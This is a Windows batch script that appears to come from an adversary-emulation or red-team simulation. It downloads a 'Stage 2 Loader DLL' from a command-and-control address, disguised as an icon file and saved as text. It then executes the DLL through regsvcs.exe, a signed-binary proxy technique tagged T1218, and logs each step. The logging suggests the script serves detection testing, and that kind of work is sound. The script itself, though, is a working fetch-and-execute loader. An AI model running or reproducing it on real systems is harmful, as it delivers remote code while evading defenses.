@echo off
setlocal enabledelayedexpansion

REM --- Placeholder constant declarations (random-named SET vars, one per PHR_*) ---
SET aBcDeFgH=%APPDATA%\12068\c070125d
SET qWeRtY=c14bb03e.txt
SET zXcVbNm=https://10.0.0.49/stage/2/icon.png?12068-7
SET lKjHgFd=ITZEL-S2B
SET pOiUyTr=12068
SET nMbVcXz=7
SET rTyUiOp=%PUBLIC%\\macula-simulations.log
SET wErTyUi=https://10.0.0.49

REM --- Cache timestamp for debug logging ---
SET tsvar=!DATE!/!TIME!

REM --- Debug: script start ---
echo [!tsvar!][DEBUG][!lKjHgFd!][!pOiUyTr!]: script_start>> "!rTyUiOp!" 2>nul

REM --- Step 1: Heartbeat fetch (download Stage 2 Loader DLL from C2) ---
echo [!tsvar!][DEBUG][!lKjHgFd!][!pOiUyTr!]: heartbeat_start>> "!rTyUiOp!" 2>nul

REM Create output directory if it does not exist
mkdir "!aBcDeFgH!" 2>nul
curl -k -s -o "!aBcDeFgH!\!qWeRtY!" "!zXcVbNm!"

echo [!tsvar!][DEBUG][!lKjHgFd!][!pOiUyTr!]: heartbeat_complete>> "!rTyUiOp!" 2>nul

REM --- Step 2: Position working directory ---
echo [!tsvar!][DEBUG][!lKjHgFd!][!pOiUyTr!]: chdir_start>> "!rTyUiOp!" 2>nul
cd /d "!aBcDeFgH!" >nul 2>&1
SET chdir_rc=!errorlevel!
echo [!tsvar!][DEBUG][!lKjHgFd!][!pOiUyTr!]: chdir_result=!chdir_rc!>> "!rTyUiOp!" 2>nul

REM --- Step 3: Invoke Stage 2 DLL via regsvcs.exe /U ---
echo [!tsvar!][DEBUG][!lKjHgFd!][!pOiUyTr!]: regsvcs_start>> "!rTyUiOp!" 2>nul
%SystemRoot%\Microsoft.NET\Framework64\v4.0.30319\regsvcs.exe /U "!qWeRtY!" >NUL 2>&1
SET regsvcs_rc=!errorlevel!
echo [!tsvar!][DEBUG][!lKjHgFd!][!pOiUyTr!]: regsvcs_result=!regsvcs_rc!>> "!rTyUiOp!" 2>nul

REM --- Step 4: Generate TTP log line ---
for /f "delims=" %%t in ('powershell -nop -c "Get-Date -Format 'yyyy-MM-dd HH:mm:ss.fff'"') do set ttp_ts=%%t
if !regsvcs_rc! equ 0 (
    SET ttp_result=OK
    SET ttp_error=
) else (
    SET ttp_result=FAIL
    SET ttp_error=regsvcs_exit_1
)
echo [!ttp_ts!][TTP][!lKjHgFd!][!pOiUyTr!]: T1218^|System Binary Proxy Execution=!ttp_result!:!ttp_error!>> "!rTyUiOp!" 2>&1

REM --- Debug: script end ---
echo [!tsvar!][DEBUG][!lKjHgFd!][!pOiUyTr!]: script_end>> "!rTyUiOp!" 2>nul

endlocal